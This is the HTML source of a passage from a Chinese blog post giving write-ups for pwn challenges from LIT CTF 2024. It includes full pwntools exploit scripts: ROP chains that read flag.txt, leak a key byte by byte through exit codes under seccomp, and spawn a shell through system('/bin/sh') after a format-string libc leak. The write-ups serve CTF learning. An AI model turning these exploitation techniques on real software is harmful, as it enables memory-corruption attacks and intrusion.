        p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> lrop<span class="token punctuation">.</span>rsi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> lrop<span class="token punctuation">.</span>rdx<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>\
        p64<span class="token punctuation">(</span>base <span class="token operator">+</span> <span class="token number">0x10257e</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'sendfile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'exit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"flag.txt\x00"</span>
<span class="token comment"># the lrop.rdx.address is point to : 0x119431 which is pop rdx ; pop r12 ; ret. my bad :( , i think it will only the pop rdx, ret.</span>

pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h5 id="pwn-iloveseccomp"><a href="#pwn-iloveseccomp" class="headerlink" title="pwn&#x2F;iloveseccomp"></a>pwn&#x2F;iloveseccomp</h5><p>这题用了一个python脚本来交互。逻辑是先会生产一个key文件，里面存8个随机字节。然后启动程序8次，而且会打印出程序退出的状态码，运行完8次之后问你key文件内容是什么。看起来是要通过main程序泄露数据。 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">from</span> os <span class="token keyword">import</span> urandom
<span class="token keyword">import</span> pwn
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

<span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  key <span class="token operator">=</span> urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"key.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
  <span class="token keyword">return</span> key

<span class="token keyword">def</span> <span class="token function">prog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  r <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"./main"</span><span class="token punctuation">)</span>
  sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvS<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">try</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"my guy"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
  r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
  sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Process exited with code </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">.</span>poll<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
  userKey <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Okay... WHAT IS THE KEY (in hex) "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> userKey <span class="token operator">==</span> key<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Lucky guess..."</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"nope"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"***The program will run eight times***\n"</span><span class="token punctuation">)</span>
  key <span class="token operator">=</span> init<span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    prog<span class="token punctuation">(</span><span class="token punctuation">)</span>
  check<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>查看保护</p>
<p><img src="https://s2.loli.net/2024/08/19/KkzQaVjOClyDugU.png" alt="d4abdb282f4542628b59de4825e9b0ba.png"></p>
<p>首先读了8个字节的随机数据， 然后将这个值&amp;0xFFFFFFFF000LL，并将其存入randAddr这个变量里，这个变量在bss段。然后用这个值作为段基址，mmap这个key文件到内存，也就是randAddr指向的地址里存放着key的内容。然后存在一个栈溢出，并开启seccomp。 </p>
<p><img src="https://s2.loli.net/2024/08/19/QS8gBHfod31eZrs.png" alt="3c4b4109abda4d7d90366e2b5ff4f378.png"></p>
<p>查看seccomp里面的内容，只允许执行ext</p>
<p><img src="https://s2.loli.net/2024/08/19/sGHaFmMgEtYQ7qo.png" alt="a0952d33b8254aa6a5f23b03d07772b5.png"></p>
<p>exit的状态码其实是自己填的（状态码返回在rdi寄存器里面），所以可以通过这个来泄露，但是exit只能泄露出最低字节，所以我们一共有8字节需要泄露就需要8次，刚好与题目对应上了。由于seccomp的存在，没法泄露数据，所以只能从一路打gadget没法打syscall（exit调用除外）或者其他的orw一类需要用到read，write，open等系统调用的链。好就好在这，可以锻炼手动写rop chain的能力。</p>
<p>为了泄露数据，我们要能知道程序的pie，libc他已经给了所以我们是知道libc的基址。那么libc中的gadget都可以用。</p>
<p><img src="https://s2.loli.net/2024/08/19/QcqNGspAhiu3xOy.png" alt="7cde6409e61247968a5abf1126d4a4c7.png"></p>
<p>寄存器中其实保留了部分程序的信息，例如rbx中存在了__libc_csu_init的地址，那我们就可以得到pie的基址，然后再加上randAddr的偏移，对其解引用就可以得到randAddr的具体值，也就可以得到key的内容，最后将其转移到rdi再调用syscall进行泄露即可。第一次写这种题目，下次做题遇到这种没见过的题目一定要有耐心！！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    
  key <span class="token operator">=</span> <span class="token string">b""</span>

  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">"Sympathy leak:"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">0x110cc0</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    
    MOV_RAX_RBX <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000008d883</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>
    SUB_RAX_RDI <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000000b1d58</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    ADD_RAX_RDI <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000000a8978</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    POP_RDI <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000023b6a</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
    DEREF_RAX <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000001411fc</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span> 
    XCHG_EDI_EAX <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000000f1b65</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>

    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x38</span> <span class="token operator">+</span> MOV_RAX_RBX <span class="token operator">+</span> POP_RDI <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">11256</span><span class="token punctuation">)</span> <span class="token operator">+</span> SUB_RAX_RDI
    pl <span class="token operator">+=</span> DEREF_RAX <span class="token operator">+</span> POP_RDI <span class="token operator">+</span> p64<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> ADD_RAX_RDI <span class="token operator">+</span> DEREF_RAX <span class="token operator">+</span> XCHG_EDI_EAX <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>exit<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Process exited with code "</span><span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    key <span class="token operator">+=</span> n<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'litte'</span><span class="token punctuation">)</span>
  
  lg<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span>key<span class="token punctuation">)</span>
  sl<span class="token punctuation">(</span>key<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h5 id="pwn-How-to-Raise-a-Boring-Vuln-Flat"><a href="#pwn-How-to-Raise-a-Boring-Vuln-Flat" class="headerlink" title="pwn&#x2F;How to Raise a Boring Vuln Flat"></a>pwn&#x2F;How to Raise a Boring Vuln Flat</h5><p>有点变形的那种house of roman，没怎么做过先留着吧。以后等变强了再来看看。 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    sl<span class="token punctuation">(</span><span class="token string">b"5"</span><span class="token punctuation">)</span>

    pl <span class="token operator">=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"%157"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$s\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$s\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"%186"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$10c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    <span class="token comment"># pause()</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    sl<span class="token punctuation">(</span><span class="token string">b"-7"</span><span class="token punctuation">)</span>
    stdout <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">7</span> <span class="token operator">+</span> <span class="token string">b"\x20\x01"</span>

    sl<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">b"\xe0"</span><span class="token punctuation">)</span>
    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">b"\xe0"</span><span class="token operator">+</span>r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>_IO_2_1_stdin_
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>

    sl<span class="token punctuation">(</span><span class="token string">b"2"</span><span class="token punctuation">)</span>
    
    pl <span class="token operator">=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"%158"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">b" "</span>
    pl <span class="token operator">+=</span> bits_str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span><span class="token string">b"$s\0\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b" "</span>
    <span class="token comment"># pause()</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">b"-7"</span><span class="token punctuation">)</span>

    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>rdi<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>binsh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>ret<span class="token punctuation">.</span>address<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>请我一杯咖啡吧！</div>
  <button>
    赞赏
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wx.jpg" alt="da1sy 微信">
        <span>微信</span>
      </div>
      <div>
        <img src="/images/zhifubao.jpg" alt="da1sy 支付宝">
        <span>支付宝</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>da1sy
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://zaoganmaqule.github.io/2024/08/15/lit-ctf-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" title="LIT - CTF - PWN部分题解">https://zaoganmaqule.github.io/2024/08/15/lit-ctf-pwn部分题解/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"># PWN</a>
              <a href="/tags/%E5%9D%90%E7%89%A2/" rel="tag"># 坐牢</a>
              <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag"># 二进制</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/08/15/wgpsec-ctf%E7%9A%84pwn%E7%B3%BB%E5%88%97/" rel="prev" title="WgpSec_CTF的pwn系列">
                  <i class="fa fa-angle-left"></i> WgpSec_CTF的pwn系列
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/08/21/bugku-ctf%E7%9A%84pwn%E9%A2%98%E8%A7%A3/" rel="next" title="Bugku_CTF的pwn题解">
                  Bugku_CTF的pwn题解 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">da1sy</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">54k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">49 分钟</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  





</body>
</html>
